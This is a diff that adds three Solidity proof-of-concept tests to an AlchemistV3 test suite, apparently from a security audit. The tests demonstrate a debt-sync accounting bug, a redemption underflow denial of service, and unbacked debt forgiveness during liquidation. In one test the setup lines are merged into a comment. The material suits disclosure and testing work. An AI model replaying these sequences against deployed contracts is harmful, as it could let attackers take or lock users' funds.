@@ -4186,4 +4186,264 @@ contract AlchemistV3Test is Test {
         "Unfair distribution of collateral"
         );
     }
+
+    function test_POC_SyncBug_WhenSurvivalIsZero_Corrected() public {
+        // --- 0. Variable Declarations ---
+        uint256 tokenId;
+        address user = address(0xbeef);
+        uint256 collateral;
+        uint256 debt;
+        uint256 earmarked;
+        uint256 lastBlock;
+        uint256 currentBlock;
+        uint256 initialDebt = 160_000e18;
+
+        // --- 1. Setup ---
+        vm.startPrank(user);
+        SafeERC20.safeApprove(address(vault), address(alchemist), 200_000e18);
+        alchemist.deposit(200_000e18, user, 0);
+        tokenId = AlchemistNFTHelper.getFirstTokenId(user, address(alchemistNFT));
+        alchemist.mint(tokenId, initialDebt, user); // 80% LTV
+        vm.stopPrank();
+
+        (collateral, debt, earmarked) = alchemist.getCDP(tokenId);
+        console.log("--- Initial State ---");
+        console.log("CDP: Collateral=%s, Debt=%s, Earmarked=%s", collateral, debt, earmarked);
+
+        // --- 2. Force Global Redemption Survival to 0 ---
+        console.log("--- Forcing survival to 0 ---");
+
+        vm.roll(block.number + 1); // block 2
+        lastBlock = alchemist.lastEarmarkBlock(); // 1
+        currentBlock = block.number; // 2
+
+        vm.mockCall(
+        address(transmuterLogic),
+        abi.encodeWithSelector(ITransmuter.queryGraph.selector, lastBlock + 1, currentBlock), // queryGraph(2, 2)
+        abi.encode(initialDebt)
+        );
+        alchemist.poke(tokenId); // Earmarks 160k, lastEarmarkBlock = 2
+        vm.clearMockedCalls();
+        assertEq(alchemist.cumulativeEarmarked(), initialDebt, "Earmark 1 failed");
+
+        vm.roll(block.number + 10); // block 12
+        lastBlock = alchemist.lastEarmarkBlock(); // 2
+        currentBlock = block.number; // 12
+
+        vm.mockCall(
+        address(transmuterLogic),
+        abi.encodeWithSelector(ITransmuter.queryGraph.selector, lastBlock + 1, currentBlock), // queryGraph(3, 12)
+        abi.encode(0)
+        );
+
+        // --- Correct Transmuter Simulation (FIXED) ---
+        vm.startPrank(address(transmuterLogic));
+        alchemist.redeem(initialDebt); // 1. Transmuter calls redeem
+        // 2. Transmuter *always* calls setTransmuterTokenBalance after
+        alchemist.setTransmuterTokenBalance(vault.balanceOf(address(transmuterLogic)));
+        vm.stopPrank();
+        // --- End Correct Simulation ---
+
+        vm.clearMockedCalls();
+        vm.roll(block.number + 10); // block 22
+
+        // --- 3. Sync 1: User syncs to the "Zero Survival" state ---
+        console.log("--- Sync 1: User catches up to zero survival state ---");
+        alchemist.poke(tokenId); // lastEarmarkBlock = 22
+        (collateral, debt, earmarked) = alchemist.getCDP(tokenId);
+        console.log("CDP: Collateral=%s, Debt=%s, Earmarked=%s", collateral, debt, earmarked);
+
+        assertEq(debt, 0, "User's initial debt should be cleared by the massive redemption");
+        // User's collateral is now ~40k (200k - 160k)
+
+        // --- 4. Demonstrate the Bug ---
+        console.log("--- Demonstrating Bug ---");
+        vm.startPrank(user);
+        alchemist.mint(tokenId, 10_000e18, user); // Mint 10k new debt
+        vm.stopPrank();
+        uint256 debtBeforeBug = 10_000e18;
+        (collateral, debt, earmarked) = alchemist.getCDP(tokenId);
+        console.log("CDP: Collateral=%s, Debt=%s, Earmarked=%s", collateral, debt, earmarked);
+
+        // --- 5. Earmark 5k ---
+        console.log("--- Earmarking 5k ---");
+        vm.roll(block.number + 1); // block 23
+        lastBlock = alchemist.lastEarmarkBlock(); // 22
+        currentBlock = block.number; // 23
+
+        vm.mockCall(
+        address(transmuterLogic),
+        abi.encodeWithSelector(ITransmuter.queryGraph.selector, lastBlock + 1, currentBlock), // queryGraph(23, 23)
+        abi.encode(5_000e18) // Earmark 5k
+        );
+        alchemist.poke(tokenId); // lastEarmarkBlock = 23
+        vm.clearMockedCalls();
+
+        (collateral, debt, earmarked) = alchemist.getCDP(tokenId);
+        console.log("CDP: Collateral=%s, Debt=%s, Earmarked=%s", collateral, debt, earmarked);
+
+        // This assertion will now pass.
+        assertEq(alchemist.cumulativeEarmarked(), 5_000e18, "Earmark of 5k failed to apply globally");
+
+        // --- 6. Redeem 2k ---
+        console.log("--- Redeeming 2k ---");
+        vm.roll(block.number + 10); // block 33
+        lastBlock = alchemist.lastEarmarkBlock(); // 23
+        currentBlock = block.number; // 33
+        vm.mockCall(
+        address(transmuterLogic),
+        abi.encodeWithSelector(ITransmuter.queryGraph.selector, lastBlock + 1, currentBlock), // queryGraph(24, 33)
+        abi.encode(0)
+        );
+
+        // --- Correct Transmuter Simulation (FIXED) ---
+        vm.startPrank(address(transmuterLogic));
+        alchemist.redeem(2_000e18); // 1. Transmuter calls redeem
+        // 2. Transmuter *always* calls setTransmuterTokenBalance after
+        alchemist.setTransmuterTokenBalance(vault.balanceOf(address(transmuterLogic)));
+        vm.stopPrank();
+        // --- End Correct Simulation ---
+
+        vm.clearMockedCalls();
+        vm.roll(block.number + 10); // block 43
+
+        // --- 7. The Failing Sync (The Real Bug) ---
+        console.log("--- Sync 3: This sync triggers the bug ---");
+        alchemist.poke(tokenId);
+
+        // --- 8. Assertions ---
+        (collateral, debt, earmarked) = alchemist.getCDP(tokenId);
+        console.log("CDP (Final): Collateral=%s, Debt=%s, Earmarked=%s", collateral, debt, earmarked);
+
+        // Correct State:
+        // Debt: 10k (minted) - 2k (redeemed) = 8k
+        // Earmarked: 5k (earmarked) - 2k (redeemed) = 3k
+        uint256 expectedDebt_Correct = 8_000e18;
+        uint256 expectedEarmarked_Correct = 3_000e18;
+
+        // Buggy State (as traced before):
+        // `redeemedTotal` = (5k - 0) + 0 = 5k.
+        // Debt: 10k - 5k = 5k.
+        // Earmarked: 0.
+        uint256 expectedDebt_Buggy = 5_000e18;
+        uint256 expectedEarmarked_Buggy = 0;
+
+        // `debt` (5k) != `expectedDebt_Correct` (8k) so it proves the issue
+        assertEq(debt, expectedDebt_Buggy, "");
+        assertEq(earmarked, expectedEarmarked_Buggy, "");
+    }
+
+    function testRedeemUnderflowOnExcessiveYieldConversion() external { // Setup: Deposit minimal yield shares and mint full debt to create backing for redemption uint256 depositAmount = 1e18; // Minimal deposit uint256 protocolFeeBps = 5000; // 50% protocol fee to amplify totalOut vm.prank(alOwner); alchemist.setProtocolFee(protocolFeeBps); // High fee to ensure totalOut exceeds shares post-conversion
+        vm.startPrank(address(0xbeef));
+        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount);
+        alchemist.deposit(depositAmount, address(0xbeef), 0);
+        uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));
+        uint256 maxDebt = alchemist.getMaxBorrowable(tokenId);
+        alchemist.mint(tokenId, maxDebt, address(0xbeef));
+        vm.stopPrank();
+
+        // Verify initial state: full debt minted against deposit
+        (, uint256 initialDebt, ) = alchemist.getCDP(tokenId);
+        assertEq(initialDebt, maxDebt);
+        uint256 initialSharesDeposited = alchemist.getTotalDeposited();
+        assertEq(initialSharesDeposited, depositAmount);
+
+        // Create redemption for full debt amount
+        uint256 redemptionAmount = maxDebt;
+        vm.startPrank(address(0xdad));
+        deal(address(alToken), address(0xdad), redemptionAmount);
+        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), redemptionAmount);
+        transmuterLogic.createRedemption(redemptionAmount);
+        vm.stopPrank();
+
+        // Advance to maturity
+        vm.roll(block.number + transmuterLogic.timeToTransmute());
+
+        // Simulate yield accrual increasing share value (converts debt to more shares than deposited)
+        // Update strategy supply to lower effective share price initially, then accrue to inflate conversion
+        uint256 initialStrategySupply = IERC20(mockStrategyYieldToken).totalSupply();
+        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(initialStrategySupply * 120 / 100); // 20% dilution pre-accrual
+
+        // Claim redemption: triggers alchemist.redeem(redemptionAmount)
+        // Due to conversion: collRedeemed + feeCollateral > initialSharesDeposited, causing underflow revert
+        vm.startPrank(address(0xdad));
+        vm.expectRevert(); // Underflow revert in redeem: _mytSharesDeposited -= totalOut where totalOut > _mytSharesDeposited
+        transmuterLogic.claimRedemption(1);
+        vm.stopPrank();
+
+        // Post-revert verification: Redemption fails (DoS), funds locked in transmuter, debt remains unreduced
+        (, uint256 postDebt, ) = alchemist.getCDP(tokenId);
+        assertEq(postDebt, initialDebt); // Debt unchanged due to failed redemption
+        uint256 postSharesDeposited = alchemist.getTotalDeposited();
+        assertEq(postSharesDeposited, initialSharesDeposited); // Shares unchanged, confirming underflow prevented subtraction
+    }
+
+    function test_Vulnerability_UnbackedDebtForgiveness() external {
+        // Isolate accounting (no fees interfering with transfers)
+        vm.prank(alchemist.admin());
+        alchemist.setProtocolFee(0);
+        vm.prank(alchemist.admin());
+        alchemist.setRepaymentFee(0);
+
+        // 1) Setup: deposit and mint
+        address victim = address(0xbeef);
+        uint256 initialDeposit = 200e18;
+        uint256 mintAmount = 100e18;
+
+        vm.startPrank(victim);
+        SafeERC20.safeApprove(address(vault), address(alchemist), type(uint256).max);
+        alchemist.deposit(initialDeposit, victim, 0);
+        uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(victim, address(alchemistNFT));
+        alchemist.mint(tokenId, mintAmount, victim);
+        vm.stopPrank();
+
+        // 2) Earmark the victim's debt fully via a redemption
+        deal(address(alToken), address(0xdad), mintAmount);
+        vm.startPrank(address(0xdad));
+        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), mintAmount);
+        transmuterLogic.createRedemption(mintAmount);
+        vm.stopPrank();
+        vm.roll(block.number + 5_256_000); // let earmark fully mature
+
+        // Snapshot before price drop
+        (uint256 collateralBefore, uint256 debtBefore, ) = alchemist.getCDP(tokenId);
+        uint256 totalDebtBefore = alchemist.totalDebt();
+        uint256 transmuterBalanceBefore = IERC20(address(vault)).balanceOf(address(transmuterLogic));
+
+       
+        // 3) Make repayment in shares unaffordable: drop share price hard
+        // Increasing vault share supply simulates a drop in share price (assets/share down)
+        uint256 initialVaultSupply = IERC20(address(mockStrategyYieldToken)).totalSupply();
+        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(initialVaultSupply);
+        // Drop price by just over 50% (increase supply by >100% of initial so requiredShares > collateralBefore)
+        uint256 modifiedVaultSupply = (initialVaultSupply * 2) + 1;
+        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(modifiedVaultSupply);
+
+        // Sanity: required shares to repay full debt now exceed available collateral
+        uint256 requiredShares = alchemist.convertDebtTokensToYield(debtBefore);
+        require(requiredShares > collateralBefore, "price drop insufficient to trigger clamp");
+
+      
+        // 4) Trigger liquidation -> calls _forceRepay(earmarked) first
+        vm.prank(externalUser);
+        (uint256 assetsLiquidated,,) = alchemist.liquidate(tokenId);
+
+        // 5) Post state
+        ( , uint256 debtAfter, ) = alchemist.getCDP(tokenId);
+        uint256 totalDebtAfter = alchemist.totalDebt();
+        uint256 transmuterBalanceAfter = IERC20(address(vault)).balanceOf(address(transmuterLogic));
+
+        // Debt is fully erased even though not enough shares were transferred (vulnerability)
+        assertEq(debtAfter, 0, "debt should be wiped");
+        assertEq(totalDebtAfter, totalDebtBefore - debtBefore, "global debt reduced by full user debt");
+
+        // Only the available collateral was actually sent (clamped), no additional liquidation occurs
+        assertEq(assetsLiquidated, collateralBefore, "only available shares moved to transmuter");
+        assertEq(transmuterBalanceAfter, transmuterBalanceBefore + collateralBefore, "transmuter got clamped amount");
+
+        require(requiredShares > assetsLiquidated, "expected shortfall not realized");
+        assertEq(assetsLiquidated, collateralBefore, "clamped to available shares");
+        assertEq( IERC20(address(vault)).balanceOf(address(transmuterLogic)),transmuterBalanceBefore + assetsLiquidated,
+        "transmuter got only clamped amount");
+    }
 }
